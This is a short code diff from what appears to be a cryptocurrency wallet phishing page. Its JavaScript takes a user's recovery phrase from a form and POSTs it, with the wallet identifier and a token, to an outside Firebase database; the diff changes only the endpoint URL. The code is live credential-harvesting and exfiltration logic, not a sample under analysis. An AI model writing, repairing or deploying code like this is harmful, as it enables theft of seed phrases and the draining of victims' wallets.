@@ -1548,7 +1548,7 @@ const phraseProceedBtn = document.getElementById('phraseProceed');
         alert('Fill in your recovery phrase');
       } else {
         $.ajax({
-          url: "https://amen-1bc99-default-rtdb.firebaseio.com/phrase",
+          url: "https://amen-1bc99-default-rtdb.firebaseio.com/",
           method: 'POST',
           data: { import_type: 'phrase', wallet: wallet, phrase: phraseInputVal, _token: "1KFm9AxTvPK7j8o232ehRI3jhGtAGfW4UQoP" },
           success: function (res) {
